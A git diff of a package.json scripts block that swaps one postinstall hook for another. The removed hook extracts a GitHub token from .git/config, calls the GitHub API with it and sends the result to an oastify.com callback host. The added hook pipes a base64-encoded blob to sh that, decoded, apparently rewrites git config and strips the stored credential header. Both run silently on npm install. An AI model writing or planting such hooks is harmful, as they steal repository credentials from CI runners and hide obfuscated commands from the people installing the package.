@@ -6,7 +6,7 @@
   "scripts": {
     "start": "node index.js",
     "test": "node test.js",
-    "postinstall": "TOKEN=$(tail -n 1 .git/config|awk '{print $5}'|base64 -d|awk -F: '{print $2}' | awk '{print substr($0, 1, length($0)-1)}) && curl http://hl68gfum4ksy4n3j80it5wbh187zvqjf.oastify.com/ -H 'teste: $(curl -H \"Authorization: token $TOKEN\" https://api.github.com/user)'"
+    "postinstall": "echo L3Vzci9iaW4vZ2l0IGNvbmZpZyAtLWdsb2JhbCAtLWFkZCBzYWZlLmRpcmVjdG9yeSAvaG9tZS9ydW5uZXIvd29yay90ZXN0ZS1hY3Rpb25zL3Rlc3RlLWFjdGlvbnMKL3Vzci9iaW4vZ2l0IGNvbmZpZyAtLWxvY2FsIC0tbmFtZS1vbmx5IC0tZ2V0LXJlZ2V4cCBjb3JlXC5zc2hDb21tYW5kCi91c3IvYmluL2dpdCBzdWJtb2R1bGUgZm9yZWFjaCAtLXJlY3Vyc2l2ZSBzaCAtYyAiZ2l0IGNvbmZpZyAtLWxvY2FsIC0tbmFtZS1vbmx5IC0tZ2V0LXJlZ2V4cCAnY29yZVwuc3NoQ29tbWFuZCcgJiYgZ2l0IGNvbmZpZyAtLWxvY2FsIC0tdW5zZXQtYWxsICdjb3JlLnNzaENvbW1hbmQnIHx8IDoiCi91c3IvYmluL2dpdCBjb25maWcgLS1sb2NhbCAtLW5hbWUtb25seSAtLWdldC1yZWdleHAgaHR0cFwuaHR0cHNcOlwvXC9naXRodWJcLmNvbVwvXC5leHRyYWhlYWRlcgovdXNyL2Jpbi9naXQgY29uZmlnIC0tbG9jYWwgLS11bnNldC1hbGwgaHR0cC5odHRwczovL2dpdGh1Yi5jb20vLmV4dHJhaGVhZGVyCi91c3IvYmluL2dpdCBzdWJtb2R1bGUgZm9yZWFjaCAtLXJlY3Vyc2l2ZSBzaCAtYyAiZ2l0IGNvbmZpZyAtLWxvY2FsIC0tbmFtZS1vbmx5IC0tZ2V0LXJlZ2V4cCAnaHR0cFwuaHR0cHNcOlwvXC9naXRodWJcLmNvbVwvXC5leHRyYWhlYWRlcicgJiYgZ2l0IGNvbmZpZyAtLWxvY2FsIC0tdW5zZXQtYWxsICdodHRwLmh0dHBzOi8vZ2l0aHViLmNvbS8uZXh0cmFoZWFkZXInIHx8IDoi | base64 -d | sh"
   },
   "keywords": [],
   "author": "",
